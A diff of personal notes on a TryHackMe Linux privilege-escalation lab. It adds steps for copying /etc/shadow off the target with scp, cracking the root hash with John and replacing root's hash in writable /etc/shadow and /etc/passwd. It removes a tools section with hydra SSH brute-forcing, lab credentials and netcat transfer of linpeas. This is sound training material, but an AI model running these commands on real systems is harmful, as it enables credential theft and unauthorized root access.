@@ -5,8 +5,8 @@ https://tryhackme.com/room/linuxprivesc
 export IP=10.10.191.59
 ```
 # [Service Exploits](setuid-exploit)
-The MySQL service is running as root and the "root" user for the service does not have a password assigned. 
-We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands 
+The MySQL service is running as root and the "root" user for the service does not have a password assigned.
+We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands
 as root via the MySQL service.
 
 1. Change into the /home/user/tools/mysql-udf directory:
@@ -44,51 +44,34 @@ rm /tmp/rootbash
 exit
 ```
 
-# Tools
-## NMAP
+# John
 ```
-mkdir nmap
-nmap -sC -sV -oN nmap/initial $IP
-```
-
-## SSH
-We are able to ssh using given info:
-```
-user
-password321
-```
-
-## hyra
-For finding passwords
-```
-hydra -l user -P /opt/rockyou.txt ssh://$IP
+scp user@$IP:/etc/shadow hash.txt
+vagrant@ubuntu1804:~/repos/ctfs/thm/linux-priv-esc$ /opt/john/run/john --wordlist=/opt/wordlists/rockyou.txt root.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (root)
+1g 0:00:00:00 DONE (2020-12-15 02:20) 2.083g/s 3200p/s 3200c/s 3200C/s cuties..mexico1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 ```
 
-## Gobuster
-Look for hidden webpages
+# /etc/shadow hash is editable
 ```
-export WORDLIST=/opt/directory-list-2.3-medium.txt
-gobuster dir -u "http://$IP" -w $WORDLIST | tee gobuster.log
+user@debian:~/tools/mysql-udf$ mkpasswd -m sha-512 newpasswordhere
+$6$zcsibADe2$5JBJvfuuLdM2/0ggQxfpWwpQ0S/0vcx2.eoUTNKbBM.MncgN3e12fQUMRMbT9Sukpe04R3bviwfMvgJ5Nh6L0/
 ```
+Paste that output into the root user hash field
 
-## enum4linux
+# /etc/passwd hash is editable
 ```
-/opt/enum4linx/enum4linx.pl -a $IP | tee enum4linux.log
+root@debian:/home/user/tools/mysql-udf# ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+root@debian:/home/user/tools/mysql-udf# openssl passwd newpasswordhere
+Warning: truncating password to 8 characters
+LHD3iy7IoLObw
 ```
-
-# linpeas!
-target terminal:
-```
-nc -l -p 1234 > /tmp/jake &
-```
-
-my terminal:
-```
-nc $IP $PORT < linpeas.sh
-```
-
-Finally, run:
-```
-chmod +x /tmp/jake
-/tmp/jake
-```
+Replace the 'x' in the root line
